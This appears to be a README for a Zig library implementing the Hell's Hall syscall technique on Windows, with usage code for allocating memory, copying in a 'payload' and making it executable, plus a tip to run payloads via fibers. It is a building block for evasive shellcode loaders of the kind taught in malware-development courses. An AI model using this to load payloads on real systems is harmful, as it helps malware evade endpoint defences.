# How to use

Add following to build.zig.zon (Hash will change, in order to get the correct hash remove the hash section and build the project, you should get the correct hash):

```zig
.dependencies = .{
    .ZigHellsHall = .{ .url = "https://github.com/KcanCurly/zighellshall/archive/refs/tags/vX.X.X.zip", .hash = "hellshall-A.B.C-HASH" },
    }
```

Add following to build.zig:

```zig
const hellshall_dep = b.dependency("ZigHellsHall", .{ .target = target, .optimize = optimize }); \
const hellshall_mod = hellshall_dep.module("ZigHellsHall"); \
exe_mod.addImport("hellshall", hellshall_mod); 
```

Add following to main.zig:

```zig
const hellshall = @import("hellshall");
const is_init = hellshall.InitNtdllConfigStructure();
if (is_init) {
    _ = hellshall.InitializeNtSyscalls(false);
}
```

# Examples
## NtAllocateVirtualMemory & NtProtectVirtualMemory
```zig
const hellshall = @import("hellshall");

var STATUS: ?windows.NTSTATUS = null;
var pAddress: ?*anyopaque = null;
var sSize: usize = base.len;
var dwOld: windows.DWORD = 0;
const hProcess: windows.HANDLE = @ptrFromInt(~@as(usize, 0));

STATUS = hellshall.run_NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE);
if (STATUS != windows.NTSTATUS.SUCCESS) {
    std.debug.print("[!] 1 Failed With Error: {any} \n", .{STATUS});
}

// ----------------------------------
// Copy your payload to pAddress here
// ----------------------------------

STATUS = hellshall.run_NtProtectVirtualMemory(hProcess, &pAddress, &sSize, windows.PAGE_EXECUTE_READ, &dwOld);
if (STATUS != windows.NTSTATUS.SUCCESS) {
    std.debug.print("[!] 2 Failed With Error: {any} \n", .{STATUS});
    return;
}
```

# Known Issues
run_NtCreateThreadEx doesn't work for some reason, try to use fiber to execute your payloads. \
[ZigFiber](https://github.com/KcanCurly/ZigFiber)

# TODO
- Implement other Nt calls.

# Credits
[Maldev Academy](https://maldevacademy.com/)